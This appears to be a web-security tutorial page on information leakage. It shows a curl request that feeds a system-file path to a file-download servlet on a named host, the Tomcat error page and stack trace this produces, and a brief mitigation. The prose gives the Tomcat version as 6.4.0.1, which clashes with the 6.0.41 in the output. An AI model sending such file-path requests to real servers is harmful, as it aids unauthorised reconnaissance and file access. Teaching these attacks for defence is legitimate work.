<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<%@include file="head.jsp" %>
<%@include file="/js/googletracking.js" %>
<title>Information Leakage</title>



</head>
<body>

<div id="wrap">

<%@include file="top.jsp" %>

<div id="content">

<div class="right">

<h1>Information Leakage</h1>

<p>
In this type of attack, a remote hacker try to reveal the server information like server name,version number etc so that the remote attacker can 
check the vulnerabily of the exposed server in tehe CVE database and try to perform thoose attack 
</p>

<pre class="brush: js;">
//This command will reveal the server information

curl 'http://zariga.com/DownloadServlet' --data 'filename=%2F/etc/hosts3'
</pre>
<hr>
<p>
The above command has exposed the server is running on Tomcat 6.4.0.1
</p>
<pre class="brush: js;">
<html><head><title>Apache Tomcat/6.0.41 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} 
H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} 
H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;
color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - /etc/hosts3 (No such file or directory)</h1><HR size="1" noshade="noshade"><p><b>type</b> Exception report</p><p><b>message</b> <u>/etc/hosts3 (No such file or directory)</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.io.FileNotFoundException: /etc/hosts3 (No such file or directory)
	java.io.FileInputStream.open(Native Method)
	java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:146)
	java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:101)
	com.servlet.DownloadServlet.doPost(DownloadServlet.java:45)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:643)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:723)
</pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/6.0.41 logs.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.41</h3></body></html>
</pre>
<hr>
<p>
Mitigation : Hide the server information, from error,HTTP header, or display the partial Information
</p>
	
</div>

<div class="lefttop"> </div>

<%@include file="left.jsp" %>

</div>

</body>
</html>